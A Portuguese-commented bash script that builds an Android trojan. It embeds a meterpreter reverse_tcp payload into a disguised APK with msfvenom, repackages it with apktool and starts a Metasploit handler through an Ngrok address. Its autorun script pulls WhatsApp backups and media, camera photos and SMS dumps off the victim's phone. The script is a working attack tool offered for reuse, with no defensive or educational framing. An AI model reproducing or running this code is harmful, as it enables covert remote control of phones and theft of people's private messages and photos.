#script que faz tudo acontecer
#cria o virus
#altera a versão sdk
#manda pra pasta compartilhada
#e inicia o msfconsole :)
 
#fique a vontade pra alterar tudo, só não faz cagada se não souber mexer 

echo "-você pode personalizar o código como bem quiser :)"
sleep "2"

echo " -digite sudo nano sm.bash(ou sm_iniciar.bash) para alterar"
sleep "2"
echo ""
echo "digite o IP do Ngrok>>" 
read ip
echo "digite a porta do Ngrok>>" 
read porta

echo """ ________________________________________________________
| tabela de templates |                                  |
|**********************                                  |
|1: sms.apk-->permissoes: sms,arquivos,audio & ringmode  |
|2: file.apk-->permissões: arquivos(de inicio),audio     |       
|________________________________________________________|
"""
echo "Digite o número do template>>"
read template_num

if [ "$template_num" -eq 1 ]; then
   template="/home/Ceifador/Downloads/sms.apk"
elif [ "$template_num" -eq 2 ]; then
   template="/home/Ceifador/Downloads/filezim.apk"
fi
echo -e "\e[0m"

msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -x $template -o teste.apk
echo "payload feito" 
rm -rf /home/Ceifador/teste/
apktool d teste.apk -f

sleep "0.1"
#troca a versão minsdk do apk para a mais recente
sed -i "s/minSdkVersion: '23'/minSdkVersion: '29'/" /home/Ceifador/teste/apktool.yml

echo "Número da versão minSdk alterado para 29 no arquivo apktool.yml."


echo "Substituição concluída."
apktool b /home/Ceifador/teste -o /home/Ceifador/teste.apk

mv /home/Ceifador/teste.apk /media/sf__home_Ceifador

#por isso eu não tenho namorada
echo "mandando trojan para o mestre Ceifador"






echo "limpando "
clear

echo "mandando trojan para o mestre Ceifador"
#comandos do mscfonsole
echo "" > comandos_msfconsole.txt
echo "use exploit/multi/handler" >> comandos_msfconsole.txt
echo "set payload android/meterpreter/reverse_tcp" >> comandos_msfconsole.txt
echo "set LHOST $ip" >> comandos_msfconsole.txt
echo "set LPORT 4444" >> comandos_msfconsole.txt

#comandos do meterpreter

#limpar comandos anteriores
echo "" > meterpreter.txt
#downloads de arquivos priorizados
echo "download -r /storage/emulated/0/Android/media/com.whatsapp/Backups/ /media/sf__home_Ceifador/hack/" >>meterpreter.txt
echo "download -r /storage/emulated/0/DCIM  /media/sf__home_Ceifador/hack/" >> meterpreter.txt
echo "download -r /storage/emulated/0/Android/media/com.whatsapp/Media/ /media/sf__home_Ceifador/hack/" >> meterpreter.txt
echo "download -r /storage/emulated/0/Whatsapp/ /media/sf__home_Ceifador/hack" >> meterpreter.txt
echo  "run meterpreter.txt" >> meterpreter.txt
#dumpar sms
echo "dump_sms" >> meterpreter.txt

#roda comandos do meterpreter nas sessões abertas e seta o script meterpreter

echo "set AutoRunScript meterpreter.txt" >> comandos_msfconsole.txt
echo "sessions -s meterpreter.txt" >>comandos_msfconsole.txt
echo "run meterpreter.txt " >> comandos_msfconsole.txt
echo "set autorunscript meterpreter.txt" >> comandos_msfconsole.txt
echo "set AutoRunScript meterpreter.txt" >> comandos_msfconsole.txt
echo "sessions -s meterpreter.txt" >> comandos_msfconsole.txt
echo "run meterpreter.txt " >> comandos_msfconsole.txt
echo "set autorunscript meterpreter.txt" >> comandos_msfconsole.txt

#configura as definições do msfconsole passadas acima:
msfconsole  -r comandos_msfconsole.txt

#ta meio desorganizado o codigo mas eu acho ele lindo :)
#obs: tem coisas que são desnecessarias onde eu seto as coisas
#por que eu estava testando e tô com preguiça de remover e também
#como diz um filosofo(eu acho) você não sabe que erro segura sua casa
#algo assim...

#fique a vontade pra alterar 
#só como eu disse antes, não faz cagada no meu código

